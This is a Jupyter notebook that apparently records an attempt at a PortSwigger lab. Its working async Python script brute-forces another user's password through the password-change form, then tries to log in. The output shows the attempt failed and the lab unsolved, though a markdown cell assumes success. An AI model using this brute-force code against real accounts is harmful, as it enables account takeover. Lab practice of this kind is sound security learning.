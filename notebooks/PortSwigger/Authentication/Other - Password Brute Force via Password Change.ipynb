{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "56fd8973",
   "metadata": {},
   "source": [
    "# Other - Password Brute-Force via Password Change\n",
    "[See lab here](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)\n",
    "\n",
    "Me: `wiener:peter`\\\n",
    "Target: `carlos`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c81685f8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import tqdm.notebook as tq\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()\n",
    "\n",
    "from load_un_pw import get_un_pw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4cbae31a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0408ecacbc754495b5549a7ba69ca878",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "URL = \"https://acd11f521f5e2f3ac0d53bee00d3004c.web-security-academy.net/\"\n",
    "\n",
    "_, passwords = get_un_pw()\n",
    "\n",
    "target_uname = \"carlos\"\n",
    "new_pw = \"test\"\n",
    "\n",
    "#Lets just try to submit the \"change password\" request over and over with carlos' username,\n",
    "#iterating through all passwords\n",
    "\n",
    "#https://acd11f521f5e2f3ac0d53bee00d3004c.web-security-academy.net/my-account/change-password\n",
    "\n",
    "async def reset_pw(session, old_pw):\n",
    "    async with session.post(\n",
    "        URL + \"my-account/change-password\", \n",
    "        data = {\"username\" : target_uname, \n",
    "                \"current-password\" : old_pw,\n",
    "                \"new-password-1\" : new_pw, \n",
    "                \"new-password-2\" : new_pw}\n",
    "        ) as response:\n",
    "        return [old_pw, await response.text()]\n",
    "    \n",
    "async def brute_force_pw_change():\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        tasks = [reset_pw(session, x) for x in passwords]\n",
    "        \n",
    "        return [await f for f in tq.tqdm(asyncio.as_completed(tasks), total=len(tasks))]\n",
    "        \n",
    "result = asyncio.run(brute_force_pw_change())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "54e966db",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[x[0] for x in result if \"Password changed successfully!\" in x[1]]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "984a023f",
   "metadata": {},
   "source": [
    "Ok so the password should now be changed. Let's log in to finish the lab"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "507b003e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = requests.post(URL + \"login\", data = {\"username\" : target_uname, \"password\" : new_pw})\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "e054c7c3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n        <title>Password brute-force via password change</title>\\n    </head>\\n    <body>\\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\\n        \\n        <div id=\"academyLabHeader\">\\n            <section class=\"academyLabBanner\">\\n                <div class=\"container\">\\n                    <div class=\"logo\"></div>\\n                        <div class=\"title-container\">\\n                            <h2>Password brute-force via password change</h2>\\n                            <a id=\\'lab-link\\' class=\\'button\\' href=\\'/\\'>Back to lab home</a>\\n                            <a class=\"link-back\" href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change\">\\n                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;\\n                                <svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 28 30\" enable-background=\"new 0 0 28 30\" xml:space=\"preserve\" title=\"back-arrow\">\\n                                    <g>\\n                                        <polygon points=\"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\"></polygon>\\n                                        <polygon points=\"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\"></polygon>\\n                                    </g>\\n                                </svg>\\n                            </a>\\n                        </div>\\n                        <div class=\"widgetcontainer-lab-status is-notsolved\">\\n                            <span>LAB</span>\\n                            <p>Not solved</p>\\n                            <span class=\"lab-status-icon\"></span>\\n                        </div>\\n                    </div>\\n                </div>\\n            </section>\\n        </div>\\n\\n        <div theme=\"\">\\n            <section class=\"maincontainer\">\\n                <div class=\"container is-page\">\\n                    <header class=\"navigation-header\">\\n                        <section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>\\n                    </header>\\n                    <header class=\"notification-header\">\\n                    </header>\\n                    <h1>Login</h1>\\n                    <section>\\n                        <p class=is-warning>Invalid username or password.</p>\\n                        <form class=login-form method=POST action=/login>\\n                            <label>Username</label>\\n                            <input required type=username name=\"username\">\\n                            <label>Password</label>\\n                            <input required type=password name=\"password\">\\n                            <button class=button type=submit> Log in </button>\\n                        </form>\\n                    </section>\\n                </div>\\n            </section>\\n        </div>\\n    </body>\\n</html>\\n'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83a58fd5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
